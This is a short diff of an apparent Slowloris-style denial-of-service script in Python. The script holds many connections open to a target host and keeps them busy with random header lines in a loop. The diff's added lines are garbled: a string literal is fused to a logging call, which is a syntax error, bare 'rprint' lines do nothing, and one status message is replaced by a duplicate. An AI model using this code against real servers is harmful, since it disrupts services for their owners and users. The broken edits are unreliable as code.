@@ -7,7 +7,6 @@ import string
 import argparse
 import ssl
 from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
-from rich.table import Table
 from rich import print as rprint
 from random import choice, randint
 
@@ -89,7 +88,7 @@ def init_attack(nAttackers):
 
 def main():
     rprint
-    logging.info("Attacking {} with {} attackers".format(host, connections))  
+    "[bold blue]"logging.info("Attacking {} with {} attackers".format(host, connections))  
     logging.info("Establishing connections..")
     attackers = []
 
@@ -102,7 +101,7 @@ def main():
     while True:
         try:
             rprint
-            logging.info("Keeping {} attacker connections alive.. ".format(len(attackers)))
+            "[bold blue]"logging.info("Attacking {} with {} attackers".format(host, connections))
             for s in list(attackers):
                 try:
                     s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
